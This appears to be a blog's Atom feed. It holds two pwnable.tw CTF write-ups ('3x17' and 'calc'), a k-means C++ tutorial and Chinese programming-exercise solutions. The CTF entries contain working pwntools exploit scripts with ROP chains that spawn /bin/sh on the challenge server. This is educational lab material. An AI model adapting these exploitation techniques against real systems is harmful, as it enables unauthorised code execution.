<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://eclipse-yes.github.io</id>
    <title>eclipse</title>
    <updated>2022-05-30T11:58:37.347Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://eclipse-yes.github.io"/>
    <link rel="self" href="https://eclipse-yes.github.io/atom.xml"/>
    <subtitle>Soda Music Computer</subtitle>
    <logo>https://eclipse-yes.github.io/images/avatar.png</logo>
    <icon>https://eclipse-yes.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, eclipse</rights>
    <entry>
        <title type="html"><![CDATA[Challenge 5. 3x17 (pwnable.tw)]]></title>
        <id>https://eclipse-yes.github.io/post/2JAgwV_kT/</id>
        <link href="https://eclipse-yes.github.io/post/2JAgwV_kT/">
        </link>
        <updated>2022-04-16T12:22:37.000Z</updated>
        <content type="html"><![CDATA[<pre><code class="language-Markdown">❯ file 3x17
3x17: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped
❯ checksec 3x17
[*] '/root/Share/pwnable.tw/5.3x17/3x17'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<p>Find the exploitable program segment:</p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char *v4; // [rsp+8h] [rbp-28h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  result = (unsigned __int8)++byte_4B9330;
  if ( byte_4B9330 == 1 )
  {
    write(1u, &quot;addr:&quot;, 5uLL);
    read(0, buf, 0x18uLL);
    v4 = (char *)(int)strtol((__int64)buf);
    write(1u, &quot;data:&quot;, 5uLL);
    read(0, v4, 0x18uLL);
    result = 0;
  }
  if ( __readfsqword(0x28u) != v6 )
    canary();
  return result;
}
</code></pre>
<p>Dynamically debug to figure out what strtol function does.<br>
strtol func: input 100 → 0x64(number)<br>
<img src="https://eclipse-yes.github.io/post-images/1650111938064.png" alt="" loading="lazy"><br>
After we put this binary file into IDA pro or Ghidra, we found that the file is stripped. Symbolic names are missing.<br>
So, we write a simple hello world program under the same environment of this elf file, and explore symbolic names in some system calls like <code>_start</code>.</p>
<pre><code>.text:0000000000401A50                               public start
.text:0000000000401A50                               start proc near                         ; DATA XREF: LOAD:0000000000400018↑o
.text:0000000000401A50                               ; __unwind {
.text:0000000000401A50 31 ED                         xor     ebp, ebp
.text:0000000000401A52 49 89 D1                      mov     r9, rdx
.text:0000000000401A55 5E                            pop     rsi
.text:0000000000401A56 48 89 E2                      mov     rdx, rsp
.text:0000000000401A59 48 83 E4 F0                   and     rsp, 0FFFFFFFFFFFFFFF0h
.text:0000000000401A5D 50                            push    rax
.text:0000000000401A5E 54                            push    rsp
.text:0000000000401A5F 49 C7 C0 60 29 40 00          mov     r8, offset sub_402960
.text:0000000000401A66 48 C7 C1 D0 28 40 00          mov     rcx, offset sub_4028D0
.text:0000000000401A6D 48 C7 C7 6D 1B 40 00          mov     rdi, offset sub_401B6D
.text:0000000000401A74                               db      67h
.text:0000000000401A74 67 E8 36 04 00 00             call    sub_401EB0
.text:0000000000401A74
.text:0000000000401A7A F4                            hlt
.text:0000000000401A7A                               ; } // starts at 401A50
</code></pre>
<pre><code>objdump -M intel -d temp_bin

0000000000001060 &lt;_start&gt;:                                                                                                                                                                    [0/137]
    1060:       f3 0f 1e fa             endbr64
    1064:       31 ed                   xor    ebp,ebp
    1066:       49 89 d1                mov    r9,rdx
    1069:       5e                      pop    rsi
    106a:       48 89 e2                mov    rdx,rsp
    106d:       48 83 e4 f0             and    rsp,0xfffffffffffffff0
    1071:       50                      push   rax
    1072:       54                      push   rsp
    1073:       4c 8d 05 66 01 00 00    lea    r8,[rip+0x166]        # 11e0 &lt;__libc_csu_fini&gt;
    107a:       48 8d 0d ef 00 00 00    lea    rcx,[rip+0xef]        # 1170 &lt;__libc_csu_init&gt;
    1081:       48 8d 3d c1 00 00 00    lea    rdi,[rip+0xc1]        # 1149 &lt;main&gt;
    1088:       ff 15 52 2f 00 00       call   QWORD PTR [rip+0x2f52]        # 3fe0 &lt;__libc_start_main@GLIBC_2.2.5&gt;
    108e:       f4                      hlt
    108f:       90                      nop
</code></pre>
<p>Check the file's segment table:<br>
<img src="https://eclipse-yes.github.io/post-images/1650112328133.png" alt="" loading="lazy"><br>
It is known as the execution flow is as follows:</p>
<pre><code>.init
.init_array[0]
.init_array[1]
…
.init_array[n]
main
.fini_array[n]
…
.fini_array[1]
.fini_array[0]
.fini
</code></pre>
<p>Deep into <code>__libc_csu_fini</code></p>
<pre><code>0x00402960 push    rbp
0x00402961 lea     rax, section..data.rel.ro ; 0x4b4100
0x00402968 lea     rbp, section..fini_array ; 0x4b40f0
0x0040296f push    rbx
0x00402970 sub     rax, rbp
0x00402973 sub     rsp, 8
0x00402977 sar     rax, 3
0x0040297b je      0x402996
0x0040297d lea     rbx, [rax - 1]
0x00402981 nop     dword [rax]
0x00402988 call    qword [rbp + rbx*8]
0x0040298c sub     rbx, 1
0x00402990 cmp     rbx, 0xffffffffffffffff
0x00402994 jne     0x402988
0x00402996 add     rsp, 8
0x0040299a pop     rbx
0x0040299b pop     rbp
0x0040299c jmp     section..fini
0x004029a1 nop     word cs:[rax + rax]
0x004029ab nop     dword [rax + rax]
</code></pre>
<p>In this funciton, rbp is set to 0x4b40f0. So, we can use <code>leave</code> instruction to shift stack frame, and write data into any memory frequently in order to fill our ROP chain.</p>
<pre><code>leave:
mov rsp, rbp
pop rbp
</code></pre>
<p><strong>Payload:</strong></p>
<pre><code class="language-python">#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author: eclipse

from pwn import *

# ! Configuration
REMOTE = 1
binfile = './3x17'
ip, port = 'chall.pwnable.tw', 10105
context(os='linux', arch='amd64', log_level='debug')
# ! Initialization
def conn():
    if REMOTE == 1: io = remote(ip, port)
    else: io = process(binfile)
    return io

# ! Exploitation
def pwn():
    def write(addr, data):
        io.sendafter('addr:', str(addr))
        io.sendafter('data:',     data)

    io, elf = conn(), ELF(binfile)
    main_addr     = 0x401B6D
    fini_arr      = 0x4B40F0
    libc_csu_fini = 0x402960
    rop_chain     = 0x4B4100
    ret           = 0x401016
    leave_ret     = 0x401C4B

    pop_rax_ret   = 0x41E4AF
    pop_rdi_ret   = 0x401696
    pop_rsi_ret   = 0x406C30
    pop_rdx_ret   = 0x446E35
    bin_sh        = 0x4B9600
    syscall_ret   = 0x471DB5

    # Loop program
    write(fini_arr, p64(libc_csu_fini) + p64(main_addr))
    # ROP: syscall('/bin/sh', 0, 0) eax=0x3b
    write(bin_sh, b'/bin/sh\x00')
    write(rop_chain,    p64(pop_rax_ret))
    write(rop_chain+8,  p64(0x3b))
    write(rop_chain+16, p64(pop_rdi_ret) + p64(bin_sh))
    write(rop_chain+32, p64(pop_rsi_ret) + p64(0))
    write(rop_chain+48, p64(pop_rdx_ret) + p64(0))
    write(rop_chain+64, p64(syscall_ret))
    # Enter rop
    write(fini_arr, p64(leave_ret) + p64(ret))
    io.interactive()

if __name__ == &quot;__main__&quot;:
    pwn()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Challenge 4. calc (pwntable.tw)]]></title>
        <id>https://eclipse-yes.github.io/post/YCimSbE1r/</id>
        <link href="https://eclipse-yes.github.io/post/YCimSbE1r/">
        </link>
        <updated>2022-04-16T12:11:07.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x1-exploration">0x1 Exploration</h1>
<pre><code class="language-Markdown">❯ checksec calc
[*] '/home/eclipse/pwnable.tw/4.calc/calc'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<p>program execution flow:<br>
main -&gt; calc function -&gt; parse_expr(expr, res_calc)<br>
Find a program segment:</p>
<pre><code class="language-c">switch ( *(_BYTE *)(i + expr) )
        {
          case '%':
          case '*':
          case '/':
            if ( operand_s[v6] != '+' &amp;&amp; operand_s[v6] != '-' )
              goto LABEL_14;
            operand_s[++v6] = *(_BYTE *)(i + expr);
            break;
          case '+':
          case '-':
LABEL_14:
            eval(res_tmp_calc, operand_s[v6]);  // Calc: +, -
                                                // In these cases: +, - is also considered as single operator !!!
            operand_s[v6] = *(_BYTE *)(i + expr);
            break;
          default:
            eval(res_tmp_calc, operand_s[v6--]);// Calc: *, /, %
            break;
        }
</code></pre>
<p>Then, we can find:<br>
When inputing: '+' + OFFSET + '+' + DATA+'\n', then mem(stack) is changed.<br>
DATA: DWORD<br>
OFFSET: DWORD (need to be calculated)<br>
So, the thought is to cover return address of main function and make use of ROP to getshell.<br>
<img src="https://eclipse-yes.github.io/post-images/1650111348011.png" alt="" loading="lazy"></p>
<p>What printf function prints out in calc is the calculated value where we can cover.<br>
offset: <code>calc_ebp + (eax) * 4 - 0x59c = main_ebp → eax</code></p>
<h1 id="0x2-find-offset">0x2 Find offset</h1>
<p>main():<br>
<img src="https://eclipse-yes.github.io/post-images/1650111515110.png" alt="" loading="lazy"><br>
calc():<br>
<img src="https://eclipse-yes.github.io/post-images/1650111523043.png" alt="" loading="lazy"><br>
<img src="https://eclipse-yes.github.io/post-images/1650111534996.png" alt="" loading="lazy"><br>
Then,<br>
0xff8ccb88 + (eax) * 4 - 0x59c = 0xff8ccba8<br>
offset = hex(int(( 0xff8ccba8 - 0xff8ccb88 + 0x59c ) / 4)) = 0x16f.<br>
So, the return address is stored in offset (0x16f + 1 = 0x170).</p>
<h1 id="0x3-find-gadgets-and-rop-chain">0x3 Find gadgets and ROP chain</h1>
<p>Referece:<br>
http://www.phobosys.de/blog_january_20.html<br>
https://medium.com/@sagidana/calc-pwnable-tw-ef5450f40253</p>
<p>Payload:</p>
<pre><code class="language-python">#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author: eclipse

from pwn import *

# ! Configuration
REMOTE = 1
binfile = './calc'
ip, port = 'chall.pwnable.tw', 10100
context(os='linux', arch='i386', log_level='debug')
# ! Initialization
def conn():
    if REMOTE == 1: io = remote(ip, port)
    else: io = process(binfile)
    return io


def get_shellcode():
    p = []
    p.append(0x080701aa) # pop edx ; ret
    p.append(0x080ec060) # @ .data
    p.append(0x0805c34b) # pop eax ; ret
    p.append(0x6e69622f) # 'bin'
    p.append(0x0809b30d) # mov dword ptr [edx], eax ; ret
    p.append(0x080701aa) # pop edx ; ret
    p.append(0x080ec064) # @ .data + 4
    p.append(0x0805c34b) # pop eax ; ret
    p.append(0x68732f2f) # '//sh'
    p.append(0x0809b30d) # mov dword ptr [edx], eax ; ret
    p.append(0x080701aa) # pop edx ; ret
    p.append(0x080ec068) # @ .data + 8
    p.append(0x080550d0) # xor eax, eax ; ret
    p.append(0x0809b30d) # mov dword ptr [edx], eax ; ret
    p.append(0x080481d1) # pop ebx ; ret
    p.append(0x080ec060) # @ .data
    p.append(0x080701d1) # pop ecx ; pop ebx ; ret
    p.append(0x080ec068) # @ .data + 8
    p.append(0x080ec060) # padding without overwrite ebx
    p.append(0x080701aa) # pop edx ; ret
    p.append(0x080ec068) # @ .data + 8
    p.append(0x080550d0) # xor eax, eax ; ret
    p.append(0x0807cb7f) # inc eax ; ret
    p.append(0x0807cb7f) # inc eax ; ret
    p.append(0x0807cb7f) # inc eax ; ret
    p.append(0x0807cb7f) # inc eax ; ret
    p.append(0x0807cb7f) # inc eax ; ret
    p.append(0x0807cb7f) # inc eax ; ret
    p.append(0x0807cb7f) # inc eax ; ret
    p.append(0x0807cb7f) # inc eax ; ret
    p.append(0x0807cb7f) # inc eax ; ret
    p.append(0x0807cb7f) # inc eax ; ret
    p.append(0x0807cb7f) # inc eax ; ret
    p.append(0x08049a21) # int 0x80
    return p


def write_dword(offset, data):
    return (&quot;+&quot; + str(0x170 + offset) + &quot;+&quot; + str(data) + &quot;+\n&quot;)


# ! Exploitation
def pwn():
    io, elf = conn(), ELF(binfile)
    payload_list = get_shellcode()
    for i, pl in enumerate(payload_list):
        payload = write_dword(i, pl)
        io.send(payload)
        io.recvline()
    io.sendline()
    io.interactive()

if __name__ == &quot;__main__&quot;:
    pwn()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Clustering in Machine Learning: k-means Algorithm]]></title>
        <id>https://eclipse-yes.github.io/post/SSxx8JVxj/</id>
        <link href="https://eclipse-yes.github.io/post/SSxx8JVxj/">
        </link>
        <updated>2022-04-08T09:16:53.000Z</updated>
        <content type="html"><![CDATA[<p>Prototyp-based clustering pretends various clusters could be discribed by a list of prototypes.</p>
<p>Prototype is a data instance that is representative of all the data.</p>
<p>This kind of algorithms usually initialize prototypes and update them iteratively. On account of not the same methods to present prototypes and ways to calculate expressions, there exists different algorithms, including k-means, Learning Vector Quantization, Mixture of  Gaussian.</p>
<figure data-type="image" tabindex="1"><img src="https://eclipse-yes.github.io/post-images/1649409638500.png" alt="" loading="lazy"></figure>
<p>The C++ implementation code is as following,</p>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

#define MAX_OPERATION 10000

// Author: eclipse

class KMeans{
private:
    vector&lt;vector&lt;double&gt;&gt; data;   // Loaded data from text file.
    vector&lt;vector&lt;int&gt;&gt; clusters;  // Vector stores each cluster which contains positions of each instance.
    vector&lt;vector&lt;double&gt;&gt; means;  // Centroids variable stores mean var among each cluster.
    vector&lt;int&gt; labels;            // Labels that contain the cluster number each instance belongs to.
    
private:
    // Find the minimal distance between x and all centroids.
    int findMinDistance(vector&lt;double&gt; &amp; x) {
        vector&lt;double&gt; distances;
        for (const auto &amp; mean : means)
            distances.push_back(pow(abs(x[0] - mean[0]), (double )2) + pow(abs(x[1] - mean[1]), 2));
        double minDis = distances[0];
        int ret = 0;
        for (int i = 0; i &lt; distances.size(); i++)
            if (distances[i] &lt; minDis) { minDis = distances[i]; ret = i; }
        return ret;
    }

    // Calculate new centroids.
    vector&lt;double&gt; calcNewMean(int i) {
        double sumX = 0, sumY = 0;
        for (const auto &amp; instanceId : clusters[i]) {
            sumX += data[instanceId][0];
            sumY += data[instanceId][1];
        }
        return vector&lt;double&gt;({ sumX / (double )clusters[i].size(), sumY / (double )clusters[i].size() });
    }

    // Deepcopy clusters.
    void deepcopy(vector&lt;vector&lt;int&gt;&gt; &amp; newClusters) {
        for (const auto &amp; cluster : clusters) {
            vector&lt;int&gt; tmp;
            for (const auto &amp; j : cluster)
                tmp.push_back(j);
            newClusters.push_back(tmp);
        }
    }

    // Compare clusters in this instance with newClusters.
    // If they are the same, return true; otherwise, return false.
    bool cmpCluster(vector&lt;vector&lt;int&gt;&gt; &amp; newClusters) {
        for (int i = 0; i &lt; clusters.size(); i++) {
            if (clusters[i].size() != newClusters[i].size()) return false;
            for (int j = 0; j &lt; clusters[i].size(); j++)
                if (clusters[i][j] != newClusters[i][j]) return false;
        }
        return true;
    }

public:
    // Load data from input.txt into vector.
    void Load(const string &amp; fileName) {
        ifstream ifs(fileName);
        string buf;
        while (getline(ifs, buf)) {
            stringstream ss(buf);
            string subStr;
            vector&lt;double&gt; instance;
            while (getline(ss, subStr, '\t'))
                if (!subStr.empty()) instance.push_back(stof(subStr));
            data.push_back(instance);
        }
        ifs.close();
    }

    // Parameter k means the number of clusters intended to get.
    // Run k-means algorithm to get the labels vector stored in instance of this class.
    void Fit(int k) {
        if (data.empty()) {
            cout &lt;&lt; &quot;Properly load data first!!!&quot; &lt;&lt; endl;
            return;
        }
        for (int i = 0; i &lt; k; i++) {
            clusters.emplace_back();  // Initialize clusters.
            means.push_back(data[(i)]); // Initialize means.
        }
        labels = vector&lt;int&gt;(data.size());  // Initialize labels.

        for (int ii = 0; ii &lt; MAX_OPERATION; ii++) {
            vector&lt;vector&lt;int&gt;&gt; newClusters;
            deepcopy(newClusters);
            for (auto &amp;cluster: clusters)  // Clear clusters.
                cluster.clear();
            for (int i = 0; i &lt; data.size(); i++) {
                int label = findMinDistance(data[i]);
                clusters[label].push_back(i);
                labels[i] = label;
            }
            for (int i = 0; i &lt; k; i++) {
                vector&lt;double&gt; newMean = calcNewMean(i);
                if (newMean[0] != means[i][0] || newMean[1] != means[i][1]) means[i] = newMean;
            }
            if (cmpCluster(newClusters)) break;
        }
    }

    void PrintLabels() {
        cout &lt;&lt; &quot;Labels:&quot; &lt;&lt; endl &lt;&lt;  &quot;[&quot;;
        for (const auto &amp; label : labels)
            cout &lt;&lt; label &lt;&lt; &quot;,&quot;;
        cout &lt;&lt; &quot;]&quot; &lt;&lt; endl;
    }

    void PrintCentroids() {
        cout &lt;&lt; &quot;Centroids:&quot; &lt;&lt; endl &lt;&lt; &quot;[&quot; &lt;&lt; endl;
        for (const auto &amp; mean : means)
            cout &lt;&lt; &quot;[&quot; &lt;&lt; mean[0] &lt;&lt; &quot;, &quot; &lt;&lt; mean[1] &lt;&lt; &quot;],&quot;&lt;&lt; endl;
        cout &lt;&lt; &quot;]&quot; &lt;&lt; endl;
    }
};

int main() {
    KMeans kMeans = KMeans();
    kMeans.Load(&quot;../Clustering/k-means/input2.txt&quot;);
    kMeans.Fit(4);
    kMeans.PrintLabels();
    kMeans.PrintCentroids();
    return 0;
}
</code></pre>
<p><a rel="license" href="http://creativecommons.org/licenses/by-sa/2.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-sa/2.0/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/2.0/">Creative Commons Attribution-ShareAlike 2.0 Generic License</a>.</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[NKUCS OJ Problems: 	Advanced Language Programming]]></title>
        <id>https://eclipse-yes.github.io/post/SIPZQTxzc/</id>
        <link href="https://eclipse-yes.github.io/post/SIPZQTxzc/">
        </link>
        <updated>2022-03-22T06:05:54.000Z</updated>
        <content type="html"><![CDATA[<h1 id="数组买卖股票的最佳时机">数组：买卖股票的最佳时机</h1>
<pre><code class="language-Markdown"># 题目描述
给定一个数组 prices ，它的第 i 个元素 prices[i] 表示一支给定股票第 i 天的价格。
你只能选择 某一天 买入这只股票，并选择在 未来的某一个不同的日子 卖出该股票。设计一个算法来计算你所能获取的最大利润。
返回你可以从这笔交易中获取的最大利润。如果你不能获取任何利润，返回 0 。

输入：[7,1,5,3,6,4]
输出：5
解释：在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。
注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。

# 样例输入输出
样例1
输入:
7 1 5 3 6 4
输出:
5
样例2
输入:
7 6 4 3 1
输出:
0
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using std::cout; using std::cin; using std::endl;
using std::vector;

class Solution {
public:
    void run() {
        vector&lt;int&gt; prices;
        int prc;
        while (cin &gt;&gt; prc) {
            prices.push_back(prc);
        }

        int maxProfit = 0, minPrc = prices[0];
        for (auto i = prices.begin(); i != prices.end(); ++i) {
            if (*i &gt; minPrc)
                maxProfit = std::max(maxProfit, *i - minPrc);
            else
                minPrc = *i;
        }
        cout &lt;&lt; maxProfit;
    }
};

int main() {
    Solution().run();
    return 0;
}
</code></pre>
<h1 id="无重复字符的最长子串">无重复字符的最长子串</h1>
<pre><code class="language-Markdown"># 题目描述
给定一个字符串 s ，请你找出其中不含有重复字符的最长子串的长度。
s由英文字母，符号，数字组成。

解释：
输入：s = ”abcabcbb”
输出：3
因为无重复字符的最长子串是“abc”，所以其长度为3

# 样例输入输出
样例
输入:
pwwkew
输出:
3
样例2
输入:
aaaa
输出:
1
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using std::cout; using std::cin; using std::endl;
using std::string; using std::map;

class Solution {
public:
    void run() {
        string str; cin &gt;&gt; str;
        map&lt;char, int&gt; dic;
        int maxLen = 0, left = 0;
        for (int i = 0; i &lt; (int)str.size(); ++i) {
            if (dic.find(str[i]) == dic.end() || dic[str[i]] &lt; left) {
                // If dic doesn't have a key of str[i],
                // insert it into dic and maxLen++.
                dic[str[i]] = i;
            }
            else {
                // If dic does have a key of str[i],
                // update left (=dic[str[i]]+1) and maxLen (=i-left+1).
                left = dic[str[i]] + 1;
                dic[str[i]] = i;
            }
            maxLen = std::max(maxLen, i - left +1);
        }
        cout &lt;&lt; maxLen;
    }
};

int main() {
    Solution().run();
    return 0;
}
</code></pre>
<h1 id="函数不死神兔问题">函数：不死神兔问题</h1>
<pre><code class="language-Markdown"># 题目描述
有一对兔子，从出生后第 3 个月起每个月都生一对兔子，小兔子长到第三个月后每个月又生一对兔子，假如兔子都不死，问第 n 个月的兔子对数为多少？
输入描述：键盘输入任意一个正整数 n，n 的范围为 [1, 20]
输出描述：输出第 n 个月兔子的对数  

# 样例输入输出
样例1
输入:
1
输出:
1
样例2
输入:
2
输出:
1
样例3
输入:
3
输出:
2
样例4
输入:
4
输出:
3
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Solution {
public:
    void run() {
        int month; cin &gt;&gt; month;
        int a = 0, b = 1;
        while (month &gt; 1) {
            int tmp = a;
            a = b;
            b += tmp;
            --month;
        }
        cout &lt;&lt; b;
    }
};

int main() {
    Solution().run();
    return 0;
}
</code></pre>
<h1 id="数组元素翻转">数组元素翻转</h1>
<pre><code class="language-Markdown"># 题目描述
键盘随机输入 n 个整数，将这些数据保存到数组中，然后再将数组元素反转，按照格式输出数组元素。

输入描述：键盘随机输入 n 个整数输出描述：
输出描述：按照格式输出反转后数组中元素，每个元素中间使用逗号和空格隔开，整体使用中括号括起来。
例如：[60, 15, 7, 80, 12, 5]

# 样例输入输出
样例1
输入:
5 12 80 7 15 60
输出:
[60, 15, 7, 80, 12, 5]
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Solution {
public:
    static void run() {
        vector&lt;int&gt; vec;
        int tmp;
        while (cin &gt;&gt; tmp) {
            vec.push_back(tmp);
        }
        reverse(vec.begin(), vec.end());
        for (int i = 0; i &lt; vec.size(); ++i) {
            if (i == 0) cout &lt;&lt; &quot;[&quot;;
            cout &lt;&lt; vec[i];
            if (i == vec.size()-1) cout &lt;&lt; &quot;]&quot;;
            else cout &lt;&lt;  &quot;, &quot;;
        }
    }
};

int main() {
    Solution::run();
    return 0;
}
</code></pre>
<h1 id="计算走过的路程和反弹高度">计算走过的路程和反弹高度</h1>
<pre><code class="language-Markdown"># 题目描述
一个小球从 h 米高度自由落下，每次落地后反跳回原高度的一半再落下，求它在第 n 次落地时共经过了多少米？第 n 次返弹多高？
输入描述：输入小球下落的高度h(double型)和落地的次数n(int型)（先输入小球初始高度再输入反弹次数）
输出描述：输出小球第 n 次落地时经过的距离和第 n 次反弹的高度（保留小数点后1位）  

# 样例输入输出
样例1
输入:
100 1
输出:
100.0 50.0
样例2
输入:
100.0 3
输出:
250.0 12.5
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Solution {
public:
    static void run() {
        double h; int n; cin &gt;&gt; h &gt;&gt; n;
        double height = h/2, sum = h;
        for (int i = 1; i &lt; n; ++i) {
            sum += height * 2;
            height /= 2;
        }
        printf(&quot;%.1f %.1f&quot;, sum, height);
    }
};

int main() {
    Solution::run();
    return 0;
}
</code></pre>
<h1 id="指针合并两个有序链表">指针：合并两个有序链表</h1>
<pre><code class="language-Markdown"># 题目描述
给定两个有序数值数组，要求先按所给数值建立两个链表，链表为升序链表。将两个升序链表合并为一个新的升序链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。

需要按以下结构体建立链表
struct ListNode {
int val;
ListNode *next;
ListNode(int x) : val(x), next(NULL) {}
};

输入：l1=[1,2,3],l2 = [1,3,4]
输出：[1，1，2，3，4，4]

提示：输入输出的标准模式请见样例输入输出，输入时可以通过两个while循环构造两个链表，其中一行为一个链表，判断当遇到‘\n’时结束循环，链表构造完成。
提示：输出的最后一个数字后无“ ”

# 样例输入输出
样例1
输入:
1 2 4
1 3 4
输出:
1 1 2 3 4 4
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

typedef struct ListNode {
    int val;
    ListNode *next;
    ListNode(): val(0), next(nullptr) {}
    ListNode(int x, ListNode* next= nullptr) : val(x), next(next) {}
} ListNode;

class Solution {
public:
    static void run() {
        // Handle input stream.
        string str, strNum;
        getline(cin, str);
        stringstream ss(str);
        vector&lt;int&gt; vec1, vec2;
        while (getline(ss, strNum, ' '))  // Let vec1 store elements of list1.
            vec1.push_back(stoi(strNum));
        getline(cin, str);
        stringstream ss2(str);
        while (getline(ss2, strNum, ' '))  // Let vec2 store elements of list2.
            vec2.push_back(stoi(strNum));

        // Initialize two linked lists.
        ListNode list1[vec1.size()];
        ListNode list2[vec2.size()];
        for (int i = 0; i &lt; vec1.size(); ++i)
            list1[i] = ListNode(vec1[i]);
        for (int i = 0; i &lt; vec1.size() - 1; ++i)
            list1[i].next = &amp;list1[i+1];
        for (int i = 0; i &lt; vec2.size(); ++i)
            list2[i] = ListNode(vec2[i]);
        for (int i = 0; i &lt; vec2.size() - 1; ++i)
            list2[i].next = &amp;list2[i+1];

        // Combine two linked lists;
        ListNode* p1 = &amp;list1[0]; ListNode* p2 = &amp;list2[0];
        auto head = ListNode(-1); ListNode* p3 = &amp;head;
        while (p1 &amp;&amp; p2) {
            if (p1-&gt;val &lt;= p2-&gt;val) { p3-&gt;next = p1; p1 = p1-&gt;next; p3 = p3-&gt;next; }
            else { p3-&gt;next = p2; p2 = p2-&gt;next; p3 = p3-&gt;next; }
        }
        if (p1) p3-&gt;next = p1;
        if (p2) p3-&gt;next = p2;

        ListNode* res = (&amp;head)-&gt;next;
        for (; res; res = res-&gt;next)
            { cout &lt;&lt; res-&gt;val; if (res-&gt;next) cout &lt;&lt; &quot; &quot;; }

    }
};


int main () {
    Solution::run();
    return 0;
}
</code></pre>
<h1 id="指针验证回文串">指针：验证回文串</h1>
<pre><code class="language-Markdown"># 题目描述
给定一个字符串，验证它是否是回文串，回文字符串就是正向和反向看完全相同的字符串，只考虑字母和数字字符，不考虑标点符号，可以忽略字母的大小写。
说明：本题中，我们将空字符串定义为有效的回文串。

示例 :
输入: &quot;A man, a plan, a canal: Panama&quot;
输出: true
解释：&quot;amanaplanacanalpanama&quot; 是回文串
示例 :
输入: &quot;race a car&quot;
输出: false
解释：&quot;raceacar&quot; 不是回文串

提示：可以先对字符串进行处理，去除标点符号将大写字母全部转换为小写

# 样例输入输出
样例1
输入:
A man, a plan, a canal: Panama
输出:
true
样例2
输入:
race a car
输出:
false
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Solution {
public:
    static void run() {
        string str; cin &gt;&gt; str;
        // Handle the input string.
        for (auto i = str.begin(); i != str.end(); ) {
            if (!isalpha(*i)) { i = str.erase(i); continue; }
            if (isupper(*i)) *i = static_cast&lt;char&gt;(tolower(*i));
            i = i + 1;
        }

        // Judge whether str is palindrome or not.
        for (int i = 0, j = static_cast&lt;int&gt;(str.size()) - 1; i != j &amp;&amp; i - 1 != j ; ++i, --j) {
            if (str[i] == str[j]) continue;
            else { cout &lt;&lt; &quot;false&quot; &lt;&lt; endl; return; }
        }
        cout &lt;&lt; &quot;true&quot; &lt;&lt; endl;
    }
};

int main () {
    Solution::run();
    return 0;
}
</code></pre>
<h1 id="放大位图">放大位图</h1>
<pre><code class="language-Markdown"># 题目描述
位图（bitmap），亦称为点阵图像或栅格图像，是由称作像素（图片元素）的单个点组成的。这些点可以进行不同的排列和染色以构成图样。当放大位图时，可以看见赖以构成整个图像的无数单个方块。扩大位图尺寸的效果是增大单个像素，从而使线条和形状显得参差不齐。然而，如果从稍远的位置观看它，位图图像的颜色和形状又显得是连续的。
现在请你设计一个程序将原来n*n的图像放大k倍。

例如，将2*2的点阵放大2倍
1	0
0	1
经过放大后新的点阵为
1	1	0	0
1	1	0	0
0	0	1	1
0	0	1	1
输出样例的每个数字后用空格隔开

# 样例输入输出
样例1
输入:
2 2
1 0
0 1
输出:
1 1 0 0
1 1 0 0
0 0 1 1
0 0 1 1
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Solution {
public:
    static void run() {
        int n, k; cin &gt;&gt; n &gt;&gt; k;
        vector&lt;vector&lt;int&gt;&gt; matrix(n, vector&lt;int&gt;(n));
        vector&lt;vector&lt;int&gt;&gt; ret;
        for (int i = 0; i &lt; n; i++) {
            for (int j = 0; j &lt; n; j++)
                cin &gt;&gt; matrix[i][j];
        }

        for (int i = 0; i &lt; n; i++) {
            vector&lt;int&gt; tmp(n * k);
            for (int j = 0; j &lt; n; j++) {
                for (int kk = 0; kk &lt; k; kk++) {
                    tmp[j * k + kk] = matrix[i][j];
                }
            }
            for (int kk = 0; kk &lt; k; kk++)
                ret.push_back(tmp);
        }
        for (const auto &amp; vec : ret) {
            for (const auto &amp; i : vec)
                cout &lt;&lt; i &lt;&lt; &quot; &quot;;
            cout &lt;&lt; endl;
        }
    }
};

int main () {
    Solution::run();
    return 0;
}
</code></pre>
<h1 id="批量注册用户">批量注册用户</h1>
<pre><code class="language-Markdown"># 题目描述
小明想要尝试注册多个用户名，用户名的规则如下：
用户名长度不能少于6位，不能多于12位；用户名必须由字母（大小写均可）构成；同一个用户名不能被重复注册；
请你编写一个程序判断小明的n个用户名是否创建成功。
